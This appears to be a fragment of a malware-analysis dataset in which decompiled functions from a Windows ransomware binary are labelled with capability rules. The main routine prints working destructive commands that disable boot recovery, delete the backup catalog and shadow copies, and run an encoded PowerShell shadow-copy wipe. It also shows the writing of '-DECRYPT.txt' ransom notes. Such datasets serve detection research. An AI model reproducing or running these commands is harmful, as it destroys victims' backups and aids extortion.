fcn.00406990(arg_8h_00, uVar7, in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec, in_stack_fffffef0);\n        uVar8 = 0x406fd5;\n        cVar3 = fcn.004049c9(uVar9);\n        if (cVar3 != '\\0') {\n            uVar9 = 0x4145b8;\n            uStack244 = 7;\n            fcn.00403597(0x4145b8);\n            fcn.00406990(uVar9, arg_8h_00, uVar7, in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec);\n            cVar3 = fcn.004049c9(uVar8);\n            bVar1 = true;\n            if (cVar3 != '\\0') goto code_r0x00407017;\n        }\n    }\n    bVar1 = false;\ncode_r0x00407017:\n    if (bVar1) {\n        fcn.00407c7d();\n        fcn.00404ab1();\n        fcn.004055ff(1);\n        fcn.0040599f();\n        fcn.00405b97();\n        fcn.00405dad();\n        fcn.00405e80();\n        fcn.00401571();\n        fcn.00405847(&stack0xffffff64);\n        fcn.00402006();\n        fcn.00407641();\n        fcn.0040793c();\n        noname_8_01 = 0x416d6c;\n        arg_24h_01 = 0x4070bf;\n        fcn.00403573(0x416d6c);\n        uVar6 = 0x4145ac;\n        fcn.00403597(0x4145ac);\n        uVar8 = 0x4070d3;\n        fcn.004068e7(uVar6, in_stack_fffffebc, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8, \n                     in_stack_fffffecc, in_stack_fffffed0, arg_24h_01, noname_8_01, arg_8h_00, uVar7, in_stack_fffffee4\n                     , in_stack_fffffee8);\n        noname_8_00 = 0x416c38;\n        arg_24h_00 = 0x4070e2;\n        fcn.00403573(0x416c38);\n        pcVar5 = \"pbkey\";\n        fcn.00403597(\"pbkey\");\n        uVar9 = 0x4070f2;\n        fcn.004068e7(pcVar5, uVar8, uVar6, in_stack_fffffebc, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8, \n                     arg_24h_00, noname_8_00, arg_24h_01, noname_8_01, arg_8h_00, uVar7);\n        noname_8 = 0x416ddc;\n        arg_24h = 0x407101;\n        fcn.00403573(0x416ddc);\n        uVar7 = 0x4145b8;\n        fcn.00403597(0x4145b8);\n        fcn.004068e7(uVar7, uVar9, pcVar5, uVar8, uVar6, in_stack_fffffebc, in_stack_fffffec0, arg_24h, noname_8, \n                     arg_24h_00, noname_8_00, arg_24h_01, noname_8_01);\n        fcn.004013ef();\n        fcn.00403597(\n                    \" /c bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet & wmic shadowcopy delete\"\n                    );\n        pcVar2 = _sym.imp.SHELL32.dll_ShellExecuteA;\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)();\n        fcn.0040135c(1);\n        fcn.00403597(\n                    \" -e RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA==\"\n                    );\n        iVar4 = 0;\n        (*pcVar2)();\n        fcn.0040135c(1);\n        if (argv == 2) {\n            fcn.00403597(*(iVar4 + 4));\n            fcn.00407f7a(&stack0xfffffe80);\n            fcn.00402af7(in_stack_fffffe80, in_stack_fffffe84, in_stack_fffffe88, in_stack_fffffe8c, in_stack_fffffe90, \n                         in_stack_fffffe94);\n            fcn.0040135c(1);\n        }\n        else {\n            arg_8h = &stack0xffffff0c;\n            uVar9 = 0x4071d0;\n            fcn.00403573(arg_8h);\n            uVar7 = 0x416c8c;\n            fcn.00403573(0x416c8c);\n            fcn.00407e9c(uVar7, in_stack_fffffe64, in_stack_fffffe68, in_stack_fffffe6c, in_stack_fffffe70, \n                         in_stack_fffffe74, in_stack_fffffe78, uVar9, arg_8h, in_stack_fffffe84, in_stack_fffffe88, \n                         in_stack_fffffe8c, in_stack_fffffe90);\n            fcn.004033a0();\n        }\n        fcn.004081b5();\n        fcn.0040a34b(0x414748);\n        fcn.00407577();\n        fcn.004044e5();\n        fcn.0040a34b(0x414744);\n        fcn.00404823(0x414744);\n        fcn.004044e5();\n        fcn.00407f7a(&stack0xfffffeac);\n        fcn.00404453();\n        fcn.0040a34b(L\"-DECRYPT.txt\\\"\");\n        fcn.00404823(L\"-DECRYPT.txt\\\"\");\n        fcn.004044e5();\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0);\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n        uVar7 = 1;\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n        fcn.0040135c(1);\n    }\n    else {\n        pcVar5 = \"pbkey\";\n        fcn.00403597(\"pbkey\");\n        uVar6 = 0x40730c;\n        fcn.00406990(pcVar5, arg_8h_00, uVar7, in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec);\n        fcn.004038f1();\n        fcn.0040135c(1);\n        uVar8 = 0x4145b8;\n        fcn.00403597(0x4145b8);\n        uVar9 = 0x407340;\n        fcn.00406990(uVar8, uVar6, pcVar5, arg_8h_00, uVar7, in_stack_fffffee4);\n        fcn.004038f1();\n        fcn.0040135c(1);\n        uVar7 = 0x4145ac;\n        fcn.00403597(0x4145ac);\n        fcn.00406990(uVar7, uVar9, uVar8, uVar6, pcVar5, arg_8h_00);\n        fcn.004038f1();\n        fcn.0040135c(1);\n        fcn.00407c7d();\n        fcn.00404ab1();\n        fcn.004055ff(0);\n        fcn.00405b97();\n        fcn.00405dad();\n        fcn.00401571();\n        fcn.00402006();\n        fcn.00407641();\n        fcn.0040793c();\n        fcn.004013ef();\n        fcn.00403597(\n                    \" /c bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet & wmic shadowcopy delete\"\n                    );\n        pcVar2 = _sym.imp.SHELL32.dll_ShellExecuteA;\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)();\n        fcn.0040135c(1);\n        fcn.00403597(\n                    \" -e RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA==\"\n                    );\n        iVar4 = 0;\n        (*pcVar2)();\n        fcn.0040135c(1);\n        if (argv == 2) {\n            fcn.00403597(*(iVar4 + 4));\n            fcn.00407f7a(&stack0xfffffe80);\n            fcn.00402af7(in_stack_fffffe80, in_stack_fffffe84, in_stack_fffffe88, in_stack_fffffe8c, in_stack_fffffe90, \n                         in_stack_fffffe94);\n            fcn.0040135c(1);\n        }\n        else {\n            fcn.004033a0();\n        }\n        fcn.004081b5();\n        fcn.0040a34b(0x414748);\n        fcn.00407577();\n        fcn.004044e5();\n        fcn.0040a34b(0x414744);\n        fcn.00404823(0x414744);\n        fcn.004044e5();\n        fcn.00407f7a(&stack0xffffff54);\n        fcn.00404453();\n        fcn.0040a34b(L\"-DECRYPT.txt\\\"\");\n        fcn.00404823(L\"-DECRYPT.txt\\\"\");\n        fcn.004044e5();\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0);\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n        uVar7 = 1;\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n        fcn.00403aec(1);\n    }\n    fcn.004083f8(uVar7);\n    return;\n}\n",
        "token_count": 3372
    },
    "00408274": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408274(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t *piVar1;\n    int16_t **in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t **ppiVar4;\n    int16_t **var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        piVar1 = in_EAX[4];\n        if ((piVar1 != NULL) && (arg_ch <= piVar1)) {\n            iVar2 = piVar1 + (1 - arg_ch);\n            var_4h = in_EAX;\n            if (0x7 < in_EAX[5]) {\n                var_4h = *in_EAX;\n            }\n            do {\n                if (iVar2 != 0) {\n                    iVar3 = iVar2;\n                    ppiVar4 = var_4h;\n                    do {\n                        if (*ppiVar4 == *arg_8h) goto code_r0x004082cb;\n                        ppiVar4 = ppiVar4 + 2;\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                }\n                ppiVar4 = NULL;\ncode_r0x004082cb:\n                if (ppiVar4 == NULL) break;\n                iVar3 = fcn.004013c7();\n                if (iVar3 == 0) {\n                    if (0x7 < in_EAX[5]) {\n                        in_EAX = *in_EAX;\n                    }\n                    return ppiVar4 - in_EAX >> 1;\n                }\n                iVar2 = iVar2 + (-1 - (ppiVar4 - var_4h >> 1));\n                var_4h = ppiVar4 + 2;\n            } while( true );\n        }\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 426
    },
    "004083f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004083f8(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x416084) {\n        return;\n    }\n    *0x416f60 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x416f64 = &arg_8h;\n    *0x416ea0 = 0x10001;\n    *0x416e48 = 0xc0000409;\n    *0x416e4c = 1;\n    var_328h = *0x416084;\n    var_324h = *0x416088;\n    *0x416e54 = unaff_retaddr;\n    *0x416f2c = in_GS;\n    *0x416f30 = in_FS;\n    *0x416f34 = in_ES;\n    *0x416f38 = in_DS;\n    *0x416f3c = unaff_EDI;\n    *0x416f40 = unaff_ESI;\n    *0x416f44 = unaff_EBX;\n    *0x416f48 = in_EDX;\n    *0x416f4c = in_ECX;\n    *0x416f50 = in_EAX;\n    *0x416f54 = unaff_EBP;\n    *0x416f58 = unaff_retaddr;\n    *0x416f5c = in_CS;\n    *0x416f68 = in_SS;\n    *0x416e98 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040c676(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x411320);\n    if (*0x416e98 == 0) {\n        fcn.0040c676(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 827
    },
    "0040b12f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b12f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4178f8, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0040b62b();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040b5e9(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0040ad97": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040ae9d: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040aea2)\n// WARNING: Removing unreachable block (ram,0x0040aed1)\n// WARNING: Removing unreachable block (ram,0x0040aea8)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ad97(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040af40(0x414de0, 0x20);\n    fcn.0040c927(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x4171a0 != 1) {\n        *0x41719c = 1;\n        *0x417198 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x417ca8);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x417ca4);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.0040b748();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.0040b748();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x417ca8);\n                        piVar2 = (*pcVar1)(*0x417ca4);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x411288;\n            while (*(unaff_EBP + -0x1c) < 0x41128c) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x411290;\n        while (*(unaff_EBP + -0x20) < 0x411294) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040c84e(8);\n    }\n    return;\n}\n",
        "token_count": 1014
    },
    "0040cbb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040cbb8(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040c84e(0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0040d986": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d986(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.0040b748();\n    var_14h = 0;\n    if (*0x417acc == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040dae3;\n        *0x417acc = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x417ad0 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x417ad4 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x417adc = (*pcVar4)(uVar3);\n        if (*0x417adc != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x417ad8 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x417ad8 == var_18h) || (*0x417adc == var_18h)) {\ncode_r0x0040da92:\n        if ((((*0x417ad0 != var_18h) && (pcVar4 = (*pcVar6)(*0x417ad0),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x417ad4 != var_18h && (pcVar4 = (*pcVar6)(*0x417ad4),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x417ad8);\n        pcVar5 = (*pcVar6)(*0x417adc);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040da92;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x417acc);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040dae3:\n    fcn.004083f8(unaff_EBX);\n    return;\n}\n",
        "token_count": 920
    },
    "0040e99e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040e99e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x40ea49;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0040ea75;\n        uStack36 = *0x416084 ^ &fcn.0040e99e::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040e99e::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040b8f8();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0040e99e::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 728
    },
    "0040ef22": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ef22(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040af40(0x415290, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar4 = fcn.0040b8f8();\n    *(iVar4 + 0x90) = *(iVar4 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040c9a6();\n        }\n        iVar4 = *(iVar1 + 8);\n        iVar3 = *(iVar4 + iVar5 * 8);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar4 + 4 + iVar5 * 8) != 0) {\n            *(iVar2 + 8) = iVar3;\n            fcn.0040fb20(*(*(iVar1 + 8) + 4 + iVar5 * 8), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar5 = iVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040efe4();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040c9a6();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.0040af85();\n    return;\n}\n",
        "token_count": 576
    },
    "0040efe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040efe4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040b8f8();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040b8f8();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0040f2ab": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f2ab(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0040ebda(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040b8f8();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040b8f8();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0040ebb3(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040f043(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "00401423": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401423(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint arg_24h;\n    uint noname_8;\n    uint in_stack_ffffff98;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint *in_stack_ffffffa4;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    fcn.00403779(*(arg_8h + 0x14));\n    noname_8 = 0x41339c;\n    arg_24h = 0x401452;\n    fcn.00403779(0x41339c);\n    puVar2 = &fcn.00401423::var_3ch;\n    fcn.00403753(puVar2);\n    iVar1 = fcn.00408231(puVar2, in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, \n                         in_stack_ffffff88, in_stack_ffffff8c, arg_24h, noname_8, in_stack_ffffff98, in_stack_ffffff9c, \n                         in_stack_ffffffa0, 